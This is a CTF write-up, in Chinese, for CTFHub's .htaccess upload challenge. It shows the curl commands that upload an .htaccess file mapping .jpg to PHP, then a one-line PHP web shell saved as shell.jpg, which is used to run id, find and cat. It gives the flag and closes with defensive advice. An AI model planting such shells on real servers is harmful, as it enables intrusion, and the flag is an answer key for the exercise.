---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - .htaccess"
date: 2026-10-28

skill: "web-upload/.htaccess"
completed: true
---

# CTFHub Writeup - .htaccess

## 题目类型

Web

## 题目描述

CTFHub 文件上传 - htaccess
Filename: [选择文件] 未选择文件
[Submit]          

## 解题过程

<br>1. 首页只有上传表单，源码末尾直接给出服务端逻辑：先取文件名并用 \`pathinfo($name)\['extension'\]\` 获取扩展名，再与包含 php、phtml、jsp、asp 等后缀的黑名单比较；扩展名不在黑名单中时执行 \`move\_uploaded\_file\`。记录指出两点：这是黑名单而非白名单，且 \`.htaccess\` 不在名单中。
<br>2. 使用 \`curl.exe -s -F "file=@test.php" -F "submit=Submit" http://.../\` 上传 \`.php\` 文件，响应为 \`\<script\>alert('文件类型不匹配')\</script\>\`，直接上传 \`.php\` 被拦截。
<br>3. 构造 \`.htaccess\` 内容 \`AddType application/x-httpd-php .jpg\`，并通过 \`echo 'AddType application/x-httpd-php .jpg' \| curl.exe -s -F "file=@-;filename=.htaccess;type=text/plain" -F "submit=Submit" http://.../\` 上传；响应为 \`\<script\>alert('上传成功')\</script\>上传文件相对路径\<br\>upload/.htaccess\`。记录中还说明服务端取 \`.htaccess\` 的扩展名得到 \`htaccess\`，不在黑名单中，因此被放行。
<br>4. 将 PHP 代码 \`\<?php echo shell\_exec($\_GET\["c"\]); ?\>\` 作为 \`shell.jpg\` 上传，记录中的命令为 \`$p \| curl.exe -s -F "file=@-;filename=shell.jpg;type=image/jpeg" -F "submit=Submit" http://.../\`；响应为 \`\<script\>alert('上传成功')\</script\>上传文件相对路径\<br\>upload/shell.jpg\`。
<br>5. 访问 \`http://.../upload/shell.jpg?c=id\`，返回 \`uid=33(www-data) gid=33(www-data) groups=33(www-data)\`；记录中还提到响应头出现 \`X-Powered-By: PHP/7.3.14\`。
<br>6. 通过 \`curl.exe -s "http://.../upload/shell.jpg?c=find%20/%20-maxdepth%205%20-iname%20%22flag\*%22%202\>/dev/null"\` 查找 flag，得到 \`/var/www/html/flag\_1489018054.php\`；再执行 \`curl.exe -s "http://.../upload/shell.jpg?c=cat%20/var/www/html/flag\_1489018054.php"\`，返回 \`\<?php // ctfhub\{96f60bfae15a3f3788293873\}\`。

## 疑问与解答

### 1.

<br>问题：为什么 \`.htaccess\` 能绕过这里的后缀黑名单？
<br>解答：服务端只通过 \`pathinfo($name)\['extension'\]\` 取扩展名并与黑名单比较，而 \`.htaccess\` 取出的扩展名是 \`htaccess\`，不在 php、phtml 等黑名单项中；黑名单没有覆盖 Apache 目录配置文件，因此该文件被直接放行。

### 2.

<br>问题：为什么上传的 \`shell.jpg\` 会被当作 PHP 执行？
<br>解答：先上传的 \`.htaccess\` 中写入了 \`AddType application/x-httpd-php .jpg\`，Apache 在对应目录解析请求时会按该配置把 \`.jpg\` 交给 PHP 处理器；因此包含 PHP 代码的 \`shell.jpg\` 被访问时执行，而不是作为静态图片返回。该机制依赖 Apache 允许 \`.htaccess\` 生效（例如 \`AllowOverride\` 配置允许覆盖）。

### 3.

<br>问题：黑名单校验与白名单校验有什么区别？
<br>解答：黑名单只列出已知危险后缀，未列出的后缀默认放行，容易遗漏配置类文件或特殊解析后缀；白名单只允许明确指定的后缀，其他一律拒绝，通常更难绕过。本题的入口正是黑名单遗漏了 \`.htaccess\`。


## 本题的核心逻辑：


<br>本题的利用链是：服务端仅用 \`pathinfo\` 取扩展名并与不完整的黑名单比较，未禁止 \`.htaccess\`；攻击者上传 \`AddType application/x-httpd-php .jpg\` 改写目录解析规则，再上传内容为 PHP 代码的 \`shell.jpg\`，访问该图片时由 Apache 交给 PHP 执行，从而获得命令执行能力并读取 flag。

<br>防御上，文件上传应优先使用白名单限制可上传扩展名，避免仅依赖黑名单；同时应禁止上传 \`.htaccess\`、\`.user.ini\` 等可改变解析或运行配置的文件，并确保上传目录不具备脚本执行权限。


## 笔记

这道题主要学习了：

<br>1. 文件上传题应先判断校验发生在哪一层、使用黑名单还是白名单；黑名单容易遗漏配置类文件、特殊后缀或解析规则相关文件。
<br>2. \`.htaccess\` 是 Apache 的目录级配置文件，作用于所在目录及其子目录，不需要重启 Apache；若上传目录允许其覆盖配置，就可能通过该文件改变解析行为。
